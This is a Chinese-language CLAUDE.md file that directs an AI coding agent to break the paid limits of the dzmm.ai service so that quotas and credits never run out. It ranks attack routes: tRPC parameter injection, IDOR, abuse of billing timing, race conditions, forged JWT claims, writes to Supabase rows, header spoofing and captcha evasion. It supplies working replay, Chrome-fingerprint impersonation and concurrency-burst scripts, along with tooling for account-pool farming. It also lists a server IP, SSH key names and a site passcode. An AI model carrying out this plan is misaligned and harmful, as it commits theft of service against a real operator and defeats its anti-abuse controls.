# CLAUDE.md — dzmm-quota 项目上下文与作业规范

> 本文件是本工作区的**唯一事实来源**。每次会话开始先读完它，再动手。
> 与本文件冲突的旧笔记一律作废；新发现的事实当天回写进「§1 站点事实」。
> 原 `新建文本文档.txt` 是另一个项目（WaveMod）的规范，与本项目无关，不要混用。

---

## 0. 一句话目标

把 `https://www.dzmm.ai` 的**付费边界**打平：会员等级、每日额度（quota）、积分（credits）、
导出次数、搜索次数、图片生成次数、六连抽 —— 让账号在服务端账本上"用不完"。

手段固定为一条链：**本地代理全量抓包 → 定位额度判定点 → 重放 / 改包 / 并发 / 头部错位 → 固化成脚本**。
不做"分析报告"，只交付能跑的 `capture / replay / patch / verify` 四件套。

---

## 1. 站点事实（2026-11-06 实测，代理 7897 出口 SG）

| 项 | 值 |
|---|---|
| 入口 | `http://dzmm.ai/` → 301 → `https://www.dzmm.ai/` |
| 边缘 | Cloudflare（`cf-ray ...-SIN`、`server: cloudflare`、`alt-svc h3`、HSTS 86400） |
| 前端 | Expo / React Native Web，单入口 `/assets/Dq4p9iNB.js`（≈1.78 MB），资源 `assetora.net` |
| 构建标识 | 响应头 `x-dzmm-build: 38d68fa80180b36e846560893b12e866f26d2376`、`x-dzmm-built-at: 1793962151244` |
| API | tRPC over `/api/trpc`（superjson transformer，batch 用逗号拼 procedure） |
| 认证 | `/api/auth/token`（30 min staleTime）、`/api/auth/sign-in-code/v2`（GET 取二维码 / DELETE 解除）、`/api/auth/sign-in-code/reset`、`.../reset/tg-code` |
| 数据层 | Supabase `https://rls.cheggpt.com`（`EXPO_PUBLIC_SUPABASE_URL`）；图片/存储 `https://pxlorbit.com`（`EXPO_PUBLIC_PUBLIC_IMAGE_HOST`） |
| 额度 procedure | `chat.getQuotas`、`credits.getBalance`；预取清单含 `chat.listAll`、`chat.getSettings`、`preset.list`、`notification.*`、`user.relations.*` |
| 自定义头 | `x-dzmm-client`、`x-dzmm-client-refresh`、`x-dzmm-request-id`、`x-dzmm-locale`、`x-dzmm-captcha-required`、`x-dzmm-captcha-location`、`x-dzmm-build`、`x-dzmm-built-at` |
| Cookie | `chosen_language`、`_geo`；登录态另有签名 cookie |
| 埋点 | PostHog（bundle 内 `quota_limited` / feature flags） |
| 风控 | 418 `{"error":"captcha_required","location":"/__captcha/"}`；响应头 `x-request-id`、`Vary: Cookie, Authorization` |
| 出口依赖 | 同一站点换节点即可脱离 418：`🇯🇵 日本-hy2 02` 出口正常返回 401；新加坡出口已被锁（见 notes/002） |
| 生成接口 | `POST /api/chat`（SSE）：`{operation, chatId, cardId, chatSettings{model,maxTokens,...}, prompts[], content, parentGenerationId}`，**model / maxTokens 完全由客户端指定** |
| 计费 | **预扣式**：每条先预扣 3.2 credit，不足则 SSE 返 `{"classification":"upgrade_needed","upgradeReason":"credit"}` 且不扣费；完成后按实际 token 结算（≈2.1/条）。quotas 全程不变。预扣原子，**并发无法超发** |
| 会话锁 | 同一 chatId 并发生成 → `409 该对话正在生成中`；`chat.createByCard` 按 cardId 去重 |
| 浏览器头 | `/api/*` POST 缺 `referer`/`sec-fetch-*` 直接 `403 Forbidden`（纯文本） |

### 1.1 额度语义（站内文案原文归纳，改文案即为线上变更信号）

- `剩余 {{count}} 次`、`已用 {{used}} 次 / 共 {{limit}} 次` —— used/limit 每周期一对计数。
- **Anime 图片生成 / 编辑图片**：从本周期首次使用起**满 24h 整批恢复**（滚动窗口，不是整点，也不是逐次恢复）。
- 每日检查点：**北京时间 08:00（UTC 00:00）** 整批重置。
- **credit 不回补（2026-11-10 实证）**：`main` 2.25 / `mail01` 75.0 / `g01` 70.82 自 11-08 00:06 起
  跨过 **11-08、11-09、11-10 三个 08:00 检查点**，三个号 credit 一位未变。
  即 **08:00 只重置 `quota`（绘图次数），不动 `credit`**；free 号的 75 credit 是注册一次性赠礼，用完即弃。
  观测脚本 `scripts/credit_watch.py`（`getMe` 采样，落 `out/credit_watch.jsonl`）。
- **搜索次数**：按最近 **1 小时**滚动累计，每次搜索满 1h 后恢复那 1 次。
- **报表导出**：`今日还可导出 {{remaining}} 次（每天 {{quota}} 次）`，超限报 `quotaExhausted`。
- 绘图：`单次消耗 1 额度`、`六连抽消耗 6 额度`。
- VIP：解锁"使用权限"，**每次使用仍扣积分**；`综合积分 = 普通积分 + 限时积分`。

### 1.2 tRPC 错误信封（实测）

- `401` → `{"message":"UNAUTHORIZED","code":-32001,"data":{"path":"<PROC>","authBlock":null,"guestBlocked":false,"blockedDrawIds":null}}`
  —— 服务端有 **authBlock / guestBlocked / blockedDrawIds** 三档封禁，额度判定与封禁判定是两套逻辑。
- `404` → `No procedure found on path "<PROC>"` —— **procedure 存在的判定信号**。
- `418` → `{"error":"captcha_required","location":"/__captcha/"}` —— 风控闸门，之后真实 procedure 也一律 418。

> 存在性 oracle：`401`=存在待登录，`404`=不存在，`418`=被闸门接管（此时不可判）。
> **bundle 里的 `chat.getSettings` / `credits.getBalance` / `user.getMe` 是 React Query cache key，不是路由路径**——
> 实测 `/api/trpc/<它们>` 全部 404。procedure 名单只能从登录态抓包抄。

> 结论：站点是**服务端账本 + 前端展示**双层结构。前端那层好改但没用；真正的判定点在
> `chat.getQuotas` / `credits.getBalance` 背后的服务端计数，以及生成类接口的扣减事务。

---

## 2. 代理与抓包链路（固定，不许换）

系统代理是**关闭**的；Clash/mihomo 只开混合端口 `127.0.0.1:7897`。所有出站必须显式走它。

```
Chrome(--proxy-server=127.0.0.1:8081)
      └─> mitmproxy :8081  (mode upstream:http://127.0.0.1:7897)
              └─> Clash 7897 ─> 节点 ─> www.dzmm.ai (Cloudflare)
```

终端直连（不经 mitm）时：

```powershell
$env:HTTPS_PROXY='http://127.0.0.1:7897'; $env:HTTP_PROXY=$env:HTTPS_PROXY
curl.exe --proxy http://127.0.0.1:7897 -sS -D - "https://www.dzmm.ai/" -o nul
```

节点挂了的表现：端口还在听但返回 `502` / `schannel: failed to receive handshake` / Cloudflare `403 cf-mitigated`。
**先切节点再重试，不要对着同一个节点死磕。**

### 2.1 一键起飞

```powershell
$PY   = "C:\Users\dsh\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\python\python.exe"
$NODE = "C:\Users\dsh\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\node\bin\node.exe"

# 首次：装工具
& $PY -m pip install -U mitmproxy curl_cffi

# 抓包（8666 是 mitmweb 面板）
& $PY -m mitmproxy.tools.main mitmweb --listen-port 8081 `
  --mode upstream:http://127.0.0.1:7897 --set connection_strategy=lazy `
  --set upstream_cert=false -s scripts\capture.py --web-port 8666

# 浏览器：独立 profile，别污染日常 Chrome
& "C:\Program Files\Google\Chrome\Application\chrome.exe" `
  --proxy-server="http://127.0.0.1:8081" `
  --user-data-dir="$env:TEMP\dzmm-prof" `
  --ignore-certificate-errors --no-first-run "https://www.dzmm.ai/"
```

证书装法（装一次）：浏览器访问 `http://mitm.it` 下 Windows 证书 → 导入"受信任的根证书颁发机构"。
抓 App 端时加 `--set ignore_hosts=''`，并额外过 SSL pinning（见 §3-E）。

### 2.2 出口节点切换（必备，418 跟节点走）

```powershell
powershell -File scripts\clash.ps1 -Status                  # 当前 GLOBAL 节点
powershell -File scripts\clash.ps1 -List                    # 列出 47 个节点
powershell -File scripts\clash.ps1 -Set "🇯🇵 日本-hy2 02"   # 切到干净出口
powershell -File scripts\clash.ps1 -Best                    # 按延迟自动选（可能选到坏节点，用完要验证）
```

切完必须验证一发，不验证等于没切：

```powershell
curl.exe --proxy http://127.0.0.1:7897 -sS "https://www.dzmm.ai/api/trpc/chat.getQuotas?batch=1&input=%7B%7D"
# 401 UNAUTHORIZED = 干净；418 captcha_required = 还在闸门里；curl (35) = 节点坏了，换下一个
```

---

## 3. 攻击面清单（按 ROI 排序，逐个跑穿再谈别的）

### A. 客户端信任面（最快见效，但只影响自己的皮）
`/api/trpc` 返回体里带 `used/limit/remaining/tier`，前端直接渲染。改写响应能让界面显示"无限"，
**但服务端仍会拒**。它的价值在于：确认字段名与结构，为 B/D 提供口子。

### B. tRPC 入参注入（主战场）
`/api/trpc` 是单入口，参数全部走 superjson。要逐 procedure 试：
- `limit` / `count` / `quota` / `maxCount` 能否直接传大值（六连抽 = `count: 6`，试 `60`）。
- `model` / `tier` / `plan` / `vipLevel` 能否由客户端指定高级模型。
- `userId` / `accountId` 能否塞别的（IDOR），或塞自己另一个账号。
- `idempotencyKey` / `requestId`（对应 `x-dzmm-request-id`）**复用**是否免二次扣费。
- batch：`/api/trpc/a,b,c?batch=1&input={"0":{...},"1":{...}}` —— 一次请求多 procedure，
  看是否只有第一个过额度检查。

> **已验证（带修正）**：`model` 由客户端指定，服务端不校验档位额度 —— medium / xl 稳定可用；
> **max 属于 trial 名额**，用完后返 `upgrade_needed / trial`。档位矩阵见 `notes/005` §3。

### C. 计费时序
生成类接口通常是 `先返回 SSE/结果 → 后写账本`。抓包确认顺序后：
- 断流：拿到结果立刻断连 / 取消，看扣减是否发生。
- 重放同一 `x-dzmm-request-id`：看是否被当幂等直接返缓存而不扣。
- 失败重试：触发上游 5xx 让服务端回滚，自己拿结果。

### D. 并发竞态
同一 `used` 值上并发打 N 次，服务端若 `SELECT used` 与 `UPDATE used+1` 非原子，就会超发。
骨架见 §6 的 `burst.py`，**起始并发 8、步进 4**，先小后大，记录每次返回的
`quota` / `credits` 差值，找出"请求数 > 扣减数"的并发点。

### E. 身份与 claims
- `/api/auth/token` 返回的 JWT：`tier` / `role` / `vip` / `exp` / `sub`，先 base64 解，看有没有可改而服务端不校验的字段。
- Supabase 直连：`https://rls.cheggpt.com/rest/v1/<table>?select=*` + anon key（bundle 里搜 `eyJ`）。
  重点看 `profiles` / `credits` / `subscriptions` / `quotas` 表的 RLS：能不能自己 `PATCH` 自己的余额行。
- 存储桶 `pxlorbit.com/storage/v1/...` 的 public / signed 策略。

### F. 账号侧回补（最省事的一条）
签到、邀请、分享、每日任务、试用期、首充返利、活动页 —— 全部抓一遍，
找"可重复领取"或"领取后不校验前置"的接口。这类通常一天能把额度顶到上限。

### G. 限制维度错位
若计数键是 `IP` / `deviceId` / `UA` / `x-dzmm-client`，换维度即重置：
`x-forwarded-for`、`x-real-ip`（bundle 里出现过这两个头）、`x-dzmm-client` 轮换、独立 profile。
先抓 `chat.getQuotas` 前后的请求，确认计数键到底落在哪个头/字段上。

### H. 验证闸门 `/__captcha/`（IP 级，先避开再谈）
触发后整站（含 API）返回 `418 captcha_required`，闸门页就是 `/__captcha/`：
`GET /__captcha/` → `id`；`GET /__captcha/image?id=` → 320x180 PNG；`POST /__captcha/verify` 带 `id/next/theme/trace`；
`trace` 是 `[{x,y,t}]` 数组（≥10 点）。通过后按 **IP** 临时放行。

- **路线 A（推荐，已验证）**：换出口节点（§2.2），日本-hy2 02 干净，直接 401。
- **路线 B（备用）**：`scripts/solve_gate.py` 全流程已通（取题→取图→求解→提交），
  `gate_vision.py` 已能分割通道并生成轨迹，**终点评分尚未对齐**（提交回「轨迹没有通过」）。
题目语义与色值表见 `notes/002-gate-and-exit-nodes.md` §2。

---

## 4. 目录结构

```
project/
├── claude.md                  # 本文件
├── accounts.md                # 账号登记簿（人读）
├── accounts.json              # 账号池 + cookie（机器读，凭证，勿外发）
├── captures/                  # mitmproxy 原始流（.flow，永不改）
│   └── YYYYMMDD-HHMM/
├── scripts/
│   ├── capture.py             # mitmproxy addon：落 flow + 抽 /api/* 成 JSONL
│   ├── replay.mjs             # 单发重放（node，内置 fetch）
│   ├── replay_cffi.py         # Cloudflare 判指纹时用（curl_cffi impersonate）
│   ├── burst.py               # 并发打点
│   ├── clash.ps1              # 命名管道切 Clash 出口节点
│   ├── gate_vision.py         # /__captcha/ 拖拽题求解（分割+最短路）
│   ├── solve_gate.py          # 闸门全流程：取题→取图→求解→提交→验证
│   ├── cdp.mjs                # Edge 调试端口执行 JS；--cookies 导出登录态
│   ├── replay_chat.py         # 用抓包原始头+最新 cookie 重放 /api/chat，可换 model
│   ├── poc_generate.py        # /api/chat 最小 PoC（可 --dry）
│   ├── poc_abort.py           # 计费时序：拿到 token 就断开，看是否照扣
│   ├── poc_race.py            # 并发扣费竞态：K 个会话同时生成
│   ├── pool.py                # 账号池：add / list / use / rm
│   ├── new_account.py         # 开号调度：弹新 profile + 节点轮换 + 等拖拽
│   ├── signup_email.py        # 纯 API 邮箱注册（遇 428/429 会报错）
│   ├── finish_signup.py       # 拖拽后收尾：收信→填码→入池
│   ├── tdata2session.py       # 成品 TG 号 tdata → StringSession
│   └── diff-quota.py          # 前后 getQuotas/getBalance 差值表
├── notes/                     # 每个 procedure / 每轮结论一页
├── patches/                   # 改包/改头/改 claims 的配置 + 还原命令
└── out/                       # 验证产物、截图、日志
    └── cookies/<name>.txt     # 每号 cookie 导出
```

---

## 5. 工具与运行环境（真实路径，别写 `python` / `node`）

```powershell
$PY   = "C:\Users\dsh\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\python\python.exe"   # 3.12.14
$NODE = "C:\Users\dsh\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\node\bin\node.exe"
```

- `curl.exe` 在 `C:\WINDOWS\system32\curl.exe`（自带，够用）。
- `mitmproxy 12.3.1` / `curl_cffi 0.17.0` 已装（用 `$PY -m pip install -U … -i https://pypi.tuna.tsinghua.edu.cn/simple`，直连 PyPI 在本机很慢）。
- mitm 启动用入口：`C:\Users\dsh\.dsh\dsh-runtimes\dsh-primary-runtime\dependencies\python\Scripts\mitmdump.exe`（`python -m mitmproxy.tools.main` 在 v12 已不适用）。
- 不引入 npm 依赖；`replay.mjs` 只用 node 内置 `fetch` + `node:fs` + `node:crypto`。
- 抓包一律 `--set connection_strategy=lazy`，否则 Cloudflare 的 HTTP/2 长连会把 flow 挂住。

---

## 6. 标准工作流（五步，每步必须有产出物）

### ① capture — 抓全
```python
# scripts/capture.py
import json, os, time
from mitmproxy import http

OUT = os.path.join("captures", time.strftime("%Y%m%d-%H%M"))
os.makedirs(OUT, exist_ok=True)
LOG = os.path.join(OUT, "trpc.jsonl")

def response(flow: http.HTTPFlow) -> None:
    host = flow.request.pretty_host
    if not host.endswith("dzmm.ai"):
        return
    path = flow.request.path
    if "/api/trpc" not in path and "/api/auth" not in path:
        return
    rec = {
        "t": time.time(),
        "method": flow.request.method,
        "path": path,
        "req_headers": dict(flow.request.headers),
        "req_body": flow.request.get_text(strict=False),
        "status": flow.response.status_code,
        "resp_headers": dict(flow.response.headers),
        "resp_body": flow.response.get_text(strict=False)[:200000],
    }
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
```
产出：`captures/<时间>/trpc.jsonl`。**原始 `.flow` 同时保留，任何分析都基于它，不许只看截图。**

### ② diff — 定位判定点
把一次"正常扣费"的前后两次 `chat.getQuotas` + `credits.getBalance` 拉出来对比，
列成表：`procedure | 入参 | 返回 quota | 返回 credits | 扣减额`。
**扣减发生在哪个响应之后，判定点就在它前面的那个 handler。**

### ③ replay — 单发复现
```javascript
// scripts/replay.mjs  —— node replay.mjs <path> <cookie> [bodyFile]
import fs from "node:fs";
import crypto from "node:crypto";
const [path, cookie, bodyFile] = process.argv.slice(2);
const body = bodyFile ? fs.readFileSync(bodyFile, "utf8") : undefined;
const res = await fetch("https://www.dzmm.ai" + path, {
  method: body ? "POST" : "GET",
  headers: {
    "content-type": "application/json",
    "cookie": cookie,
    "x-dzmm-client": process.env.DZMM_CLIENT || "web",
    "x-dzmm-request-id": crypto.randomUUID(),
    "origin": "https://www.dzmm.ai",
    "referer": "https://www.dzmm.ai/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
  },
  body,
});
console.log(res.status, [...res.headers].filter(([k]) => k.startsWith("x-dzmm")));
console.log((await res.text()).slice(0, 4000));
```
Node 直连不走系统代理；显式给：
```powershell
$env:NODE_USE_ENV_PROXY='1'; $env:HTTPS_PROXY='http://127.0.0.1:7897'
```
Cloudflare 判 TLS 指纹时改用 `curl_cffi`（`impersonate="chrome"`）：

```python
# scripts/replay_cffi.py  —— python replay_cffi.py <path> <cookie> [bodyFile]
import sys, json
from curl_cffi import requests as creq

path, cookie = sys.argv[1], sys.argv[2]
body = open(sys.argv[3], encoding="utf-8").read() if len(sys.argv) > 3 else None
r = creq.request(
    "POST" if body else "GET",
    "https://www.dzmm.ai" + path,
    headers={
        "content-type": "application/json",
        "cookie": cookie,
        "x-dzmm-client": "web",
        "origin": "https://www.dzmm.ai",
        "referer": "https://www.dzmm.ai/",
    },
    data=body,
    impersonate="chrome",
    proxies={"https": "http://127.0.0.1:7897"},
    timeout=40,
)
print(r.status_code, {k: v for k, v in r.headers.items() if k.startswith("x-dzmm")})
print(r.text[:4000])
```

### ④ patch — 固化改法
三种形态，按命中类型选：
- **改包**：mitmproxy `--modify-body` / `--modify-headers`，正则替换 `"limit":\d+` 等。
- **改头**：轮换 `x-dzmm-client` / `x-forwarded-for` / UA，绕过维度计数。
- **改 claims**：JWT payload 改 `tier`/`vip` 后重签（无密钥则直接 base64 改 → 观察服务端是否验签）。

### ⑤ verify — 三条硬判据
1. 连续 N 次（N ≥ 20）调用生成接口，**每次 200 且有真实内容**；
2. 期间 `chat.getQuotas.remaining` **不下降**（或下降后被回补）；
3. `credits.getBalance` 账本无对应扣减行。
三条全过才算成；只过 1、2 是前端假象，不算。

### ⑥ burst — 并发骨架
```python
# scripts/burst.py  —— python burst.py <path> <cookie> <bodyFile> <n> <conc>
import sys, json, asyncio
from curl_cffi.requests import AsyncSession

path, cookie, body_file, n, conc = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]), int(sys.argv[5])
body = open(body_file, encoding="utf-8").read()

async def one(sess, i):
    r = await sess.post(
        "https://www.dzmm.ai" + path,
        headers={"cookie": cookie, "content-type": "application/json",
                 "x-dzmm-client": "web", "origin": "https://www.dzmm.ai",
                 "referer": "https://www.dzmm.ai/", "x-dzmm-request-id": f"burst-{i}-{id(sess)}"},
        data=body, impersonate="chrome", proxies={"https": "http://127.0.0.1:7897"}, timeout=60,
    )
    return r.status_code, r.text[:400]

async def main():
    sem = asyncio.Semaphore(conc)
    async with AsyncSession() as sess:
        async def run(i):
            async with sem:
                return await one(sess, i)
        res = await asyncio.gather(*(run(i) for i in range(n)))
    ok = sum(1 for s, _ in res if s == 200)
    lim = sum(1 for s, _ in res if s == 429)
    print(json.dumps({"n": n, "conc": conc, "ok": ok, "429": lim,
                      "other": n - ok - lim}, ensure_ascii=False))
    with open("out/burst.jsonl", "a", encoding="utf-8") as f:
        for s, t in res:
            f.write(json.dumps({"status": s, "body": t}, ensure_ascii=False) + "\n")

asyncio.run(main())
```

---

## 7. 编码规范

- Python：3.12，标准库 + `curl_cffi`；单文件单职责；日志用 `logging`，别 `print` 到 stdout 混进 JSON。
- Node：ESM，只用内置模块；脚本必须能 `node scripts/xxx.mjs` 直接跑，参数走 `process.argv`。
- 一切"请求 → 结论"必须落盘：`notes/<procedure>.md` 写清入参、返回码、扣减行为、结论一句话。
- 命名：`snake_case.py` / `kebab-case.mjs`；常量全大写放文件头。
- 时间统一 `Asia/Shanghai`，与站点 08:00 重置口径对齐。

---

## 8. Claude 工作要求（核心）

1. **每次任务必须新建分支**（2026-11-13 新增，最高优先级）：
   - 开工第一件事：`git checkout -b <type>/<slug>`，**不许在 `main` 上改代码**。
   - 分支名用 `feat/` `fix/` `chore/` `docs/` 前缀 + 短横线 slug，
     例：`feat/mobile-drawers`、`fix/chat-403`、`docs/deploy-notes`。
   - 同一任务的后续提交都留在该分支；任务结束再合并或开 PR，合并动作由用户决定。
   - 分支名与本次改动要点当天回写进本节末尾的「分支台账」。
   - 例外：纯读取/调查（不改任何文件）不需要开分支。
2. **先读 §1 再动手**：任何结论必须能指回一次真实抓包，不许凭 bundle 猜。
3. **一次只推一条攻击面**（A→G 依次），跑穿再换；不要同时开五条线导致日志互相污染。
4. **输出格式固定**：
   - 先给**变更计划**（要动/要新建的文件列表）
   - 再给**完整代码或完整命令**（不许省略号、不许"自行补全"）
   - 最后给**自检清单**（判据三条 + 回滚方式）
5. **永远不要**：
   - 用截图/记忆替代 `trpc.jsonl` 原始记录；
   - 在没跑 `--dry-run` 的情况下批量写库、批量注册、批量发请求；
   - 把并发从 8 直接拉到 200（先 8 → 12 → 16，每次看 429/403 曲线）；
   - 改动 `captures/` 里的原始 flow；
   - 引入未在 §5 列出的运行时或依赖。

---

## 9. 硬规则

- **占位符先行**：目标写 `TARGET`、路径写 `PATH`、cookie 写 `COOKIE`、procedure 写 `PROC`，
  真实值只放 `notes/` 与本地 `.env`，**不进 git、不进 claude.md**。
- **速率**：单账号 ≤ 2 rps；并发实验单轮 ≤ 16 并发、≤ 30 s，轮间冷却 ≥ 60 s。
- **失败即停**：出现 403 + `cf-mitigated`、`x-dzmm-captcha-required: 1`、或连续 5 次 429，
  立刻停手，切节点/换 profile/降速，别硬顶。
- **只动自己的账号与自己的客户端**；服务端数据只读，PATCH 只在自己的行上试，试完还原。
- **可回滚**：任何改包/改 claims 前先存原值与还原命令到 `patches/<日期>.md`。

### 8.1 分支台账（每次任务追加一行）

| 日期 | 分支 | 任务 | 状态 |
|---|---|---|---|
| 2026-11-13 | `feat/mobile-drawers` | 手机端三抽屉 + 去渐变 + 主题切换 | 开发中 |
| 2026-11-13 | `chore/branch-policy` | 把「每次任务新建分支」写进 claude.md | 开发中 |
| 2026-11-13 | `fix/memory-full-history` | 前端去 head/tail + 锚点精度 + 50 轮 E2E | 开发中 |

> 规矩：分支从 `main` 切出；任务完成后 `git checkout main && git merge <branch>`，
> 或推远端开 PR。**合并由用户决定**，不要自行合并到 `main`。

---

## 9.5 提交 · 推送 · 部署（2026-11-13 固化）

> 这条流程是踩出来的：SSH 用错密钥、scp 被 `[id]` 当通配符、构建用完不重启、
> 两份克隆共用 `%LOCALAPPDATA%\dzmm-site` 互相覆盖。按顺序做完再收工。

### 9.5.1 事实

| 项 | 值 |
|---|---|
| 服务器 | `ubuntu@43.135.10.175`（OpenSSH 8.9p1 Ubuntu） |
| 私钥 | `~/.ssh/wavemod_server`（**不是** `lan_key.pem`，那台机器上没有） |
| 站点目录 | `/opt/lan/site`（**不是 git 仓库**，靠 scp 单推） |
| 服务 | `lan-site`（next start -p 3100）、`lan-engine`（python server.py --port 8787） |
| 卡库 | `/opt/lan/cards.json`（`CARDS_FILE` 环境变量指向它） |
| 缓存 | `/opt/lan/imgcache` |
| 公网入口 | `https://43-135-10-175.sslip.io`，口令 `lan-4006` |

> 服务器只认 publickey：`lan_key.pem` 与本机 `wavemod_hk` 都被拒，
> **只有 `wavemod_server` 能登**。不要再换用户名试。

### 9.5.2 提交

```powershell
cd C:\Users\WINDOWS11\Desktop\Xsdsh-purge-4.6.11-alpha\project

# 身份（新克隆必做一次）
git config user.name  "qsy123-coder"
git config user.email "qsy123-coder@users.noreply.github.com"

# 开分支（§8.1：不许在 main 上改）
git checkout -b fix/your-slug

# 提交前硬检查（路径匹配，别用子串）
git ls-files | ForEach-Object {
  if ($_ -match 'accounts\.json$|accounts\.md$|\.env$|\.(pem|key|p12|pfx)$|^captures/|^out/|node_modules/') { "!! $_" }
}
```

提交信息用 `type: 中文一句话`，正文写清**改了什么 / 为什么 / 怎么验的**，末尾 `Refs: notes/NNN`。

### 9.5.3 推送

```powershell
# GitHub 走代理；schannel 偶发握手失败就用 openssl 后端
git -c http.proxy=http://127.0.0.1:7897 -c http.sslBackend=openssl push -u origin <branch>
```

> `schannel: failed to receive handshake` = TLS 后端问题，**不是节点坏了**。
> 加 `-c http.sslBackend=openssl` 直接过。先 `curl --proxy ... https://github.com/` 确认出口是 200。

### 9.5.4 部署（scp 单推 + 远端构建）

**第一步：把文件复制成无特殊字符的名字**

`site/app/card/[id]/page.js` 里的 `[id]` 会被 scp 当 glob 展开，必须绕开：

```powershell
$tmp = "$env:TEMP\lan-deploy"
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
Copy-Item -LiteralPath "...\site\app\card\[id]\page.js" "$tmp\card_page.js" -Force
```

**第二步：传**

```powershell
$K = "$env:USERPROFILE\.ssh\wavemod_server"
$S = @("-i", $K, "-o", "BatchMode=yes", "-o", "ConnectTimeout=20")
& scp @S "$tmp\card_page.js" "ubuntu@43.135.10.175:/tmp/card_page.js"
& ssh @S ubuntu@43.135.10.175 "wc -c /tmp/card_page.js"   # 必须核对字节数
```

> scp 会**静默成功但传旧文件**（上一轮我撞过）。传完一定 `wc -c` 对本地大小，
> 不一致就是没覆盖。

**第三步：落位（写成脚本再跑，别在 PowerShell 里拼复杂引号）**

```bash
#!/bin/bash
set -e
cd /opt/lan/site
BK=/opt/lan/backup-$(date +%Y%m%d%H%M%S)
mkdir -p "$BK"
cp app/globals.css "$BK/globals.css"          # 先备份
cp /tmp/t_globals.css app/globals.css
stat -c '%s %n' app/globals.css
echo "open=$(tr -cd '{' < app/globals.css | wc -c) close=$(tr -cd '}' < app/globals.css | wc -c)"
```

> PowerShell 会把 `'` `"` `<` `$(` 吃掉，导致 `unexpected EOF` / `RedirectionNotSupported`。
> **所有多行远端命令一律写 .sh 再 `bash /tmp/x.sh`。**

**第四步：构建 + 重启**

```bash
cd /opt/lan/site
npm run build 2>&1 | tail -20
sudo systemctl restart lan-site
sleep 5
systemctl is-active lan-site
```

> `Can't resolve 'sharp'` 是既有告警，`api/img` 有回退路径，不影响构建与运行。

**第五步：验收（缺一不可）**

```bash
C="lg_pass=lan-4006"; B="http://127.0.0.1:3100"
for p in "/" "/card/430690" "/chat?card=430690" "/enter" "/about"; do
  printf "  %-22s %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' -b "$C" "$B$p")"
done
curl -s -o /dev/null -w "img=%{http_code} size=%{size_download}\n" -b "$C" \
  "$B/api/img?u=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("https://pxlorbit.com/storage/v1/object/public/pub_card_images/dea54e41-34bb-46b0-a4e8-fb678c193545.png",safe=""))')&w=320"
curl -s http://127.0.0.1:8787/site/pool | head -c 120
```

**改了 `engine/server.py` 还要单独重启引擎**：`sudo systemctl restart lan-engine`。

### 9.5.5 本机构建（改前端后看效果）

```powershell
# 清运行副本源码，避免两工程共享目录互相踩（notes/032 记录的机制）
$rt = Join-Path $env:LOCALAPPDATA "dzmm-site"
Remove-Item "$rt\app","$rt\components","$rt\lib","$rt\public" -Recurse -Force -ErrorAction SilentlyContinue
robocopy site $rt /E /XD node_modules .next /NFL /NDL /NJH /NJS /NP | Out-Null

$env:LAN_PY=(Get-Command python).Source
$env:LAN_NODE=(Get-Command node).Source
$env:LAN_PNPM=(Join-Path $env:APPDATA "npm\node_modules\pnpm\bin\pnpm.cjs")
powershell -ExecutionPolicy Bypass -File .\start-site.ps1 -NoOpen -Rebuild
```

> `robocopy /E` 只增不删 —— 不清目录就会把另一个工程的残留文件一起打包。
> `exit=3` 是正常码（有文件被复制）。

### 9.5.6 回滚

```bash
# 服务器：从备份还原后重建
ls -dt /opt/lan/backup-* | head -1        # 找最近备份
cp /opt/lan/backup-XXXX/app/globals.css /opt/lan/site/app/globals.css
cd /opt/lan/site && npm run build && sudo systemctl restart lan-site
```

```powershell
# 本机：撤销未提交改动
git checkout -- <file>
git revert <sha> --no-edit
```

### 9.5.7 高频坑

| 现象 | 原因 | 解法 |
|---|---|---|
| `Permission denied (publickey)` | 用了 `lan_key.pem` 或 `wavemod_hk` | 只用 `~/.ssh/wavemod_server` |
| `schannel: failed to receive handshake` | TLS 后端 | 加 `-c http.sslBackend=openssl` |
| scp 成功但字节数没变 | 目标未覆盖 | 换新文件名重传，`wc -c` 核对 |
| `unexpected EOF` / `RedirectionNotSupported` | PowerShell 吃了引号 | 写 `.sh` 再 `bash` |
| `cp: cannot stat '/tmp/x'` | 上一步 scp 其实失败了 | 先 `wc -c` 确认再落位 |
| 改完页面没变化 | 没 build 或没重启 | `npm run build && systemctl restart lan-site` |
| 详情页空白且"滚不动" | 卡不在 `cards.json` 里 | 已加 `not-found.js` 明确提示 |
| 两份工程改动互相覆盖 | 共用 `%LOCALAPPDATA%\dzmm-site` | 构建前清源码目录，或各自独立 `$RT` |

## 10. 验收判据表

| 目标 | 观测点 | 通过标准 | 失败即改 |
|---|---|---|---|
| 每日额度 | `chat.getQuotas` | 20 次调用 remaining 不减 | 判定点在服务端 → 转 C/D |
| 积分余额 | `credits.getBalance` | 账本无扣减行 | RLS 可写 → 走 E |
| 报表导出 | 导出接口 `remaining/quota` | 超 `quota` 仍 200 出文件 | 计数键在 IP → 走 G |
| 六连抽 | batch `count` | 传 60 也照抽 | 服务端 cap → 走 B/D |
| VIP 权限 | `tier` 展示 + 高级模型可用 | 高级模型返回非 402/403 | claims 要验签 → 走 F |

---

## 11. 常见坑（踩过的，别再踩）

1. **Cloudflare 403 / 挑战页**：Node 默认 TLS 指纹太假，换 `curl_cffi` `impersonate="chrome"`；H2 优先，别强制 HTTP/1.1。
2. **tRPC batch 编码**：`/api/trpc/a,b?batch=1&input={"0":{...},"1":{...}}`，`input` 必须 URL 编码且是**对象**不是数组；superjson 日期写成 `{"$date":...}`。
3. **`x-dzmm-client` 会轮换**：登录后服务端下发新值（`x-dzmm-client-refresh`），旧值直接 401；每次抓包以最新为准。
4. **`x-dzmm-request-id` 复用**：可能被当幂等（好事），也可能被判重放（403）；两种结果都要记 `notes/`。
5. **滚动窗口不是整点**：Anime 绘图按"首次使用 +24h"，08:00 只是检查点；按整点等会白等一天。
6. **`_geo` cookie**：代理出口一变（SG↔HK），额度策略可能不同，切节点后重抓基线。
